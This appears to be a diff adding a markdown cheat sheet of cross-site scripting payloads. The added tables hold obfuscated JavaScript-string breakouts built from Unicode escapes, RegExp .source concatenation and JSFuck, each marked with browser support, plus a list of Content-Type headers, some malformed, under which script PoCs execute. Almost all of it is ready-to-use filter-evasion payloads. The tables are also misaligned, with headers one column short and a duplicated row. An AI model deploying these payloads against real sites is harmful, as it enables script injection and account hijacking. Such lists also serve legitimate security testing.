@@ -60,6 +60,75 @@
 | **GlobalThis** | `';globalThis['\141\154\145\162\164']('\130\123\123');` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
 
 ## Unicode Escape Sequences
+# XSS Payloads and Content Types
+
+## XSS Payloads into JavaScript Strings
+
+### Unicode Escape Sequences
+
+| **Payload** | **Chrome** | **Firefox** | **Safari** | **Link** |
+|-------------|------------|-------------|------------|----------|
+| **Self**    | `';self['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+| **This**    | `';this['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+| **Top**     | `';top['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+| **Parent**  | `';parent['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+| **Frames**  | `';frames['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+| **GlobalThis** | `';globalThis['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+
+### RegExp Source Property
+
+| **Payload** | **Chrome** | **Firefox** | **Safari** | **Link** |
+|-------------|------------|-------------|------------|----------|
+| **Window**  | `';window[/al/.source+/ert/.source](/XSS/.source);//` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+| **Self**    | `';self[/al/.source+/ert/.source](/XSS/.source);//` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+| **This**    | `';this[/al/.source+/ert/.source](/XSS/.source);//` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+| **Top**     | `';top[/al/.source+/ert/.source](/XSS/.source);//` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+| **Parent**  | `';parent[/al/.source+/ert/.source](/XSS/.source);//` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+| **Frames**  | `';frames[/al/.source+/ert/.source](/XSS/.source);//` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+| **GlobalThis** | `';globalThis[/al/.source+/ert/.source](/XSS/.source);//` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+
+### Hieroglyphy/JSFuck
+
+| **Payload** | **Chrome** | **Firefox** | **Safari** | **Link** |
+|-------------|------------|-------------|------------|----------|
+| **Window**  | `';window[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+| **Self**    | `';self[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+| **This**    | `';this[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+| **Top**     | `';top[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+| **Parent**  | `';parent[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+| **Frames**  | `';frames[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+| **GlobalThis** | `';globalThis[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+
+## Content Types
+
+### Standard Content Types
+
+| **Content-Type** | **Chrome** | **Firefox** | **Safari** | **PoC** |
+|------------------|------------|-------------|------------|---------|
+| **text/html**    | ✔️ | ✔️ | ✔️ | `<script>alert(document.domain)</script>` |
+| **application/xhtml+xml** | ✔️ | ✔️ | ✔️ | `<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(document.domain)</x:script>` |
+| **application/xml** | ✔️ | ✔️ | ✔️ | `<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(document.domain)</x:script>` |
+| **text/xml** | ✔️ | ✔️ | ✔️ | `<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(document.domain)</x:script>` |
+| **image/svg+xml** | ✔️ | ✔️ | ✔️ | `<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(document.domain)</x:script>` |
+| **text/xsl** | ✔️ | ✔️ | ✔️ | `<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(document.domain)</x:script>` |
+| **application/vnd.wap.xhtml+xml** | ✔️ | ✔️ | ✔️ | `<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(document.domain)</x:script>` |
+| **text/rdf** | ✔️ | ✔️ | ❌ | `<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(document.domain)</x:script>` |
+| **application/rdf+xml** | ✔️ | ✔️ | ❌ | `<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(document.domain)</x:script>` |
+| **application/mathml+xml** | ✔️ | ✔️ | ❌ | `<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(document.domain)</x:script>` |
+| **text/vtt** | ✔️ | ✔️ | ❌ | `<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(document.domain)</x:script>` |
+| **text/cache-manifest** | ✔️ | ✔️ | ❌ | `<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(document.domain)</x:script>` |
+
+### Response Content Types
+
+| **Content-Type** | **Chrome** | **Firefox** | **Safari** | **PoC** |
+|------------------|------------|-------------|------------|---------|
+| **text/plain; x=x, text/html, foobar** | ✔️ | ✔️ | ✔️ | `<script>alert(document.domain)</script>` |
+| **text/html(xxx** | ✔️ | ✔️ | ❌ | `<script>alert(document.domain)</script>` |
+| **text/html xxx** | ✔️ | ✔️ | ❌ | `<script>alert(document.domain)</script>` |
+| **text/html xxx** | ✔️ | ✔️ | ❌ | `<script>alert(document.domain)</script>` |
+| **text/html, xxx** | ✔️ | ✔️ | ❌ | `<script>alert(document.domain)</script>` |
+| **text/html; xxx** | ✔️ | ✔️ | ❌ | `<script>alert(document.domain)</script>` |
+
 
 | **Payload** | **Chrome** | **Firefox** | **Safari** | **Link** |
 |-------------|------------|-------------|------------|----------|
